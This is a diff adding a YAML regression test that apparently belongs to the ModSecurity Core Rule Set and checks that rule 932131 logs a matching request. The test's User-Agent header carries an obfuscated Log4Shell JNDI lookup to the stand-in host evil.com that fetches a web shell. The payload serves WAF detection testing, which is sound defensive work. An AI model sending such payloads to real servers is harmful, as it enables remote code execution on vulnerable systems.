@@ -1,0 +1,23 @@
+---
+meta:
+  author: "dune73, Max Leske"
+  enabled: true
+  name: "932131.yaml"
+  description: "Tests to trigger or not trigger rule 932131"
+tests:
+  - test_title: 932131-1
+    desc: Log4J test with evasion
+    stages:
+      - stage:
+          input:
+            dest_addr: "127.0.0.1"
+            headers:
+              Accept: "*/*"
+              User-Agent: ModSecurity CRS 3 Tests ${:1337:-x$}{jndi:ldap://evil.com/webshell}
+              Host: "localhost"
+            method: "GET"
+            port: 80
+            uri: "/"
+            protocol: "http"
+          output:
+            log_contains: id "932131"
